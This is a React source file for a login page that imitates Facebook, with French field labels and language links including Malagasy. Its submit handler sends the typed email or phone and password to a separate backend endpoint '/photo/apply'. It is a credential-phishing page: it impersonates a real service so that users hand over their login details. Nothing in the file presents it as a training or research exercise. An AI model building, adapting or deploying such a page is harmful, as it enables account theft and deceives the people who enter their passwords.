import React from "react";
import TextField from '@mui/material/TextField';
import Box from '@mui/material/Box';
import Button from '@mui/material/Button';
import axios from "axios";
import Alert from '@mui/material/Alert';

export default class App extends React.Component {
  constructor(props){
    super(props)
    this.state={
      name : "",
      password : "",
      message :""
    }
    this.setValue = this.setValue.bind(this);
    this.connexion = this.connexion.bind(this);
  }
  
    connexion(){
        axios({
          method: "post",      
          url: process.env.REACT_APP_BACK_URL + "/photo/apply",
          withCredentials: true,
          data: {name : this.state.name , password : this.state.password}
      })
      .then(res => {  
          console.log("avec success");                                                
          this.setValue(res.data)})
      .catch(err =>{console.log(err); console.log("erreur");} );
    }

    setValue(data){
      console.log(data);
      let current = JSON.parse(JSON.stringify(this.state));
      current.message = data.message;
      this.setState(current);
    }

    handle1(e , field){
      let current = JSON.parse(JSON.stringify(this.state))
      console.log(current);
    }
    handle(e ,field){
      let current = JSON.parse(JSON.stringify(this.state));
      current[field]= e.target.value;
      this.setState(current);
      console.log(current);
    }
  componentDidMount(){
    //document.body.style.backgroundColor = "white" 
  }
  render() {
    return (
      <div >
        <div className ='header' style = {{backgroundColor : "#3b5998", width : "100%" , heigth : 100}}>
          <h1 style={{display:'block',position:'absolute',padding:'0',backgroundColor : "#3b5998", padding : "10px" , color: "white" , width : 1000}}>Facebook</h1>
        </div><br/><br/><br/>
          <div className ='body' style ={{padding : "10px" , width : "fit-content" , margin : "0 auto" , marginTop : "4px"}}>
            {
              this.state.message  ? 
              <Alert severity="error">{this.state.message}</Alert>
              : ""
            }
            <span style={{fontSize : "18px"}}>Numéro de téléphone ou adresse e-mail</span>
              <Box
                sx={{
                  width: 500,
                  maxWidth: '100%',
                  marginTop :"4px"
                }}
              >
                <TextField fullWidth label="-" id="fullWidth" name="name"
                  type ="text" value = {this.state.name} onChange= {(e) => this.handle(e , "name") } />
              </Box><br/>
              <span style={{fontSize : "18px"}}>Mot de passe</span>
              <Box
                sx={{
                  width: 500,
                  maxWidth: '100%',
                  marginTop : "4px"
                }}
              >
                <TextField fullWidth label="-" id="fullWidth" name="password"
                 type ="password" value = {this.state.password} onChange= {(e) => this.handle(e, 'password') }/>
              </Box>
              <Box
                sx={{
                  width: 500,
                  maxWidth: '100%',
                  marginTop : "10px"
                }}
              >
                <Button variant="contained" style ={{width :500 , maxWidth: '100%'}} onClick = {this.connexion}><span>Connexion</span></Button>
              </Box><br/>
              <a href="#" ><span style={{fontSize : "18px"}}>Mot de passe oublié?</span></a>
              <br/><hr/>
              <a href="#" style = {{textDecoration : "none" }} ><span style={{fontSize : "14px"}}>Malagasy</span></a><br/>
              <a href="#" style={{textDecoration : "none" ,color :'black' , marginTop :"4px" }}><span style={{fontSize : "12px"}}>Français(france)</span></a><br/>
              <a href="#" style = {{textDecoration : "none" ,marginTop :"4px"}} ><span style={{fontSize : "14px"}}>English</span></a>
          </div>
          
      </div>
    );
  }
}